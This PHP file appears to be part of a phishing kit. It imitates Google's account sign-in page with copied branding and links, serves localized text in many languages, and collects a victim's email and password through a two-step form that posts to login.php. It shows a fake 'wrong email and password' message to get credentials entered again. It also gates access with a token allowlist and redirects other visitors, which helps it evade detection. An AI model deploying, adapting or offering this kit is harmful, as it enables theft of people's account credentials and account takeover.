<?php
session_start();
function getUserIP()
{
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];

	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	}
	else if (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	}
	else {
		$ip = $remote;
	}

	return $ip;
}
error_reporting(0);
$v = (empty($_GET['v']) ? NULL : $_GET['v']);
$email = (empty($_GET['email']) ? NULL : $_GET['email']);
$accessed = file_get_contents('../../access.txt');
if ($_SERVER['HTTP_HOST'] != 'localhost') {
	if (empty($v) & empty($email)) {
		(include '../redir.html');
		exit();
	}

	if (strstr($accessed, $v) || strstr($accessed, $email)) {
	}
	else {
		(include '../redir.html');
		exit();
	}
}

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

switch ($lang) {
case 'en':
	$lang_file = 'lang.english.php';
	break;

case 'pt':
    $lang_file = 'lang.portuguese.php';
    break;
	
case 'id':
	$lang_file = 'lang.indo.php';
	break;
	
case 'nl':
	$lang_file = 'lang.nederland.php';
	break;
	
case 'fr':
	$lang_file = 'lang.french.php';
	break;
	
case 'ru':
	$lang_file = 'lang.rusia.php';
	break;
	
case 'es':
	$lang_file = 'lang.spanish.php';
	break;
	
case 'de':
	$lang_file = 'lang.german.php';
	break;
	
case 'ja':
	$lang_file = 'lang.japan.php';
	break;
	
case 'vi':
	$lang_file = 'lang.vietnam.php';
	break;
	
case 'pl':
	$lang_file = 'lang.polish.php';
	break;
	
case 'zh':
	$lang_file = 'lang.chinese.php';
	break;
	
case 'it':
	$lang_file = 'lang.italia.php';
	break;

case 'hu':
	$lang_file = 'lang.hungary.php';
	break;
	
case 'th':
	$lang_file = 'lang.thailand.php';
	break;

default:
    $lang_file = 'lang.english.php';
}

include_once '../languages/' . $lang_file;
echo'<!DOCTYPE html>
<html lang="in">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>';echo $lang['TITTLE'] ;echo'</title>
  <link rel="stylesheet" href="../css/google.css">
  <style>
* {
  box-sizing: border-box;
}



#regForm {
  background-color: #f1f1f1;
  margin: 10px auto;
  font-family: Arial, sans-serif;
  padding: 20px 20px 50px 20px;
  width: 30%;
  min-width: 300px;
}

input {
  padding: 10px;
  width: 100%;
  font-size: 17px;
  font-family: Arial, sans-serif;
  border: 1px solid #aaaaaa;
}

/* Mark input boxes that gets an error on validation: */
input.invalid {
  background-color: #ffdddd;
}

/* Hide all steps by default: */
.tab {
  display: none;
}

button {
  background-color: #4CAF50;
  color: #ffffff;
  border: none;
  padding: 200px 20px;
  margin: 8px auto;
  width: 100%;
  min-width: 300px;
  font-size: 17px;
  font-family: Arial, sans-serif;
  cursor: pointer;
}

button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}

/* Make circles that indicate the steps of the form: */
.step {
  height: 15px;
  width: 15px;
  margin: 0 2px;
  background-color: #bbbbbb;
  border: none;  
  border-radius: 50%;
  display: inline-block;
  opacity: 0.5;
}

.step.active {
  opacity: 1;
}

/* Mark the steps that are finished and valid: */
.step.finish {
  background-color: #4CAF50;
}
</style>
  </head>
  <body>
  <div class="wrapper">
  <div  class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div  class="main content clearfix">
<div class="banner">
<h1>
  ';echo $lang['ONE'] ;echo'
</h1>
  <h2 class="show-small">
  ';echo $lang['SIGN_WITH'] ;echo'
  </h2>
</div>

<form id="regForm" action="login.php?email='.$email.'&v='.$v.'" class="cloud-login form-ajax" role="form" method="post" accept-charset="utf-8" required>
  <img class="circle-mask" src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">
  <input type="email" value="';echo $email ;echo'" name="" placeholder="" style="display:none">
  <input type="text" value="';echo $v ;echo'" name="" placeholder="" style="display:none">
  <!-- One "tab" for each step in the form: -->
  <div class="tab">
  <label>';echo $lang['EMAIL'] ;echo'</label>
   <p><input type="email" value="';echo $email ;echo'" name="appleid" id="appleid" placeholder="';echo $lang['EMAIL'] ;echo'" required></p>
  </div>
   <p style="font-weight:300px; color: red; font-size: 13px; text-align:center; padding-top:1px"> wrong email and password</p>
  <div class="tab">
<label>';echo $lang['PASSWORD'] ;echo'</label>
<p><input type="password" value="" name="password" id="password" placeholder="';echo $lang['PASSWORD'] ;echo'" autocomplete="off" required></p>
  </div>
  <button type="button" id="nextBtn" class="rc-button rc-button-submit" onclick="nextPrev(1)" value=""></button>
  <p><a class="need-help" href="https://accounts.google.com/signin/usernamerecovery?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro&amp;service=accountsettings&amp;osid=1&amp;flowName=GlifWebSignIn&amp;hl=id">
  ';echo $lang['FIND_ACCOUNT'] ;echo'</a></p>
  <!-- Circles which indicates the steps of the form: -->
  <div style="display:none">
    <span class="step"></span>
  </div>
  </form>
<div class="card-mask-wrap shift-form no-name">
  <div class="card-mask">
  <div class="one-google">
  <p class="create-account">
  <span id="link-signin-different">
  <a href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro&amp;hl=en&amp;service=accountsettings">
  ';echo $lang['SIGN_DIFFERENT'] ;echo'
  </a>
  </span>
  </p>
<p class="tagline">
  ';echo $lang['EVERYTHING'] ;echo'
</p>
<div class="logo-strip"></div>
  </div>
  </div>
</div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="https://www.google.com/intl/en/about" target="_blank">
  ';echo $lang['ABOUT'] ;echo'
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=ID&amp;hl=en&amp;privacy=true" target="_blank">
  ';echo $lang['PRIVACY'] ;echo'
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=ID&amp;hl=en" target="_blank">
  ';echo $lang['TERM'] ;echo'
  </a>
  </li>
  <li>
  <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
  ';echo $lang['HELP'] ;echo'
  </a>
  </li>
  </ul>
  </div>
  </div>
</div>

  <script>
var currentTab = 0; // Current tab is set to be the first tab (0)
showTab(currentTab); // Display the current tab

function showTab(n) {
  // This function will display the specified tab of the form...
  var x = document.getElementsByClassName("tab");
  x[n].style.display = "block";
  //... and fix the Previous/Next buttons:
  if (n == (x.length - 1)) {
    document.getElementById("nextBtn").innerHTML = "';echo $lang['SIGN'] ;echo'";
  } else {
    document.getElementById("nextBtn").innerHTML = "';echo $lang['NEXT'] ;echo'";
  }
  //... and run a function that will display the correct step indicator:
  fixStepIndicator(n)
}

function nextPrev(n) {
  // This function will figure out which tab to display
  var x = document.getElementsByClassName("tab");
  // Exit the function if any field in the current tab is invalid:
  if (n == 1 && !validateForm()) return false;
  // Hide the current tab:
  x[currentTab].style.display = "none";
  // Increase or decrease the current tab by 1:
  currentTab = currentTab + n;
  // if you have reached the end of the form... :
  if (currentTab >= x.length) {
    //...the form gets submitted:
    document.getElementById("regForm").submit();
    return false;
  }
  // Otherwise, display the correct tab:
  showTab(currentTab);
}


function validateForm() {
  // This function deals with validation of the form fields
  var x, y, i, valid = true;
  x = document.getElementsByClassName("tab");
  y = x[currentTab].getElementsByTagName("input");
  // A loop that checks every input field in the current tab:
  for (i = 0; i < y.length; i++) {
    // If a field is empty...
    if (y[i].value == "") {
      // add an "invalid" class to the field:
      y[i].className += " invalid";
      // and set the current valid status to false:
      valid = false;
    }
  }
  
 return valid; // return the valid status
}

</script>
<script src="js/log.js"></script>
  </body>
</html>';

?>